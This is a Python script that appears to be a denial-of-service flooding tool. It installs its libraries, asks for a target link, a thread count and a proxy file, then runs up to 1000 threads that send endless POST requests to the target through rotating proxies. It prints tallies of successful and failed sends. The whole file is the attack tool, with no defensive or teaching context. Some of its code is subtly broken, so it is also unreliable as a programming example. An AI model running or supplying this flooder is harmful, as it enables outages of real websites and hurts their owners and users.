import os

# INSTALLING LIBRARIES

iz = '3'

print('\r[~]Installing Libraries...', end='')
print(f'\r[~]Installing Libraries 1/{iz} | numpy   ', end='')
os.system('pip install numpy >nul')
print(f'\r[~]Installing Libraries 2/{iz} | requests', end='')
os.system('pip install requests >nul')
print(f'\r[~]Installing Libraries 3/{iz} | PySocks ', end='')
os.system('pip install PySocks >nul')
print('\r[+]Libraries installed successfully!      ', end='')

# PROGRAMS
import requests
import threading
import numpy

url = input('\n\nLINK: ')
thread = int(input('THREADS[max: 1000]: '))
if thread > 1000:
    print(f'You have entered more threads than 1000, the value is set to 1000\n')
    thread = 1000
file_name = input('FILENAME PROXY: ')

with open(file_name, 'r') as f:
    proxy_base = f.readlines()

a = 0
for proxy in proxy_base:
    try:
        response = requests.post(url, proxies=proxy)
        a += response.elapsed.total_seconds()
    except:
        pass

sred = round(a/len(proxy_base), 1)
print(f'Средяя скоость ответа сервера - {sred} сек.\n')

if thread == 1000:
    timeout = sred + 1
elif thread >= 500:
    timeout = sred + 0.5
elif thread >= 100:
    timeout = sred + 0.3
elif thread < 100:
    timeout = sred + 0.1

o = 0
b = 0
proxy_use = 0

def att(pro):
    global o
    global b
    proxies = {
        'http': f'http://{pro}',
        'https': f'http://{pro}'
    }
    while True:
        try:
            requests.post(url, timeout=timeout, proxies=proxies)
            o += 1
        except:
            b += 1
        print(f'\rSECUSSEFUL PACKET SEND - {o} || FAILED SEND PACKET - {b}', end='')

while True:
    for i in proxy_base:
        threading.Thread(target=att, args=i,).start()
        proxy_use += 1
        if proxy_use == thread:
            break
    if proxy_use == thread:
        break
